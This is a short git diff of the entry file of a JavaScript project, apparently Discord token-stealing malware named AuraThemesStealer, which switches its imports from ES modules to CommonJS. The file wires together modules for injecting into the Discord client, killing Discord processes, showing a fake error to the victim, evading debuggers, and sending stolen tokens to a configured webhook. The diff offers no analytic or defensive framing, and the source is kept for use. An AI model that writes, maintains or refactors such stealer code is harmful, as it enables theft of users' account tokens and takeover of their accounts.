@@ -1,14 +1,14 @@
 
-import("dotenv").then(dotenv => dotenv.config());
-import("./utils/console/error.mjs").then(error => error.error());
+require("dotenv").config();
+require("./utils/console/error.js").error();
 
-import { get_info } from "./modules/core/core.mjs";
-import { discord_injected, kill_discords } from "./modules/injections/discord.mjs";
-import { fake_error } from "./modules/fake_error/fake.mjs";
-import { send_webhook_tokens } from "./modules/tokens/send.mjs";
-import { antidebug } from "./modules/antidebug/antidebug.mjs";
+const { get_info } = require("./modules/core/core.js");
+const { discord_injected, kill_discords } = require("./modules/injections/discord.js");
+const { fake_error } = require("./modules/fake_error/fake.js");
+const { send_webhook_tokens } = require("./modules/tokens/send.js");
+const { antidebug } = require("./modules/antidebug/antidebug.js");
 
-import config from "./config/config.mjs";
+const config = require("./config/config.js");
 
 const {
     WEBHOOK,
@@ -50,4 +50,3 @@ class AuraThemesStealer {
 }
 
 new AuraThemesStealer();
-
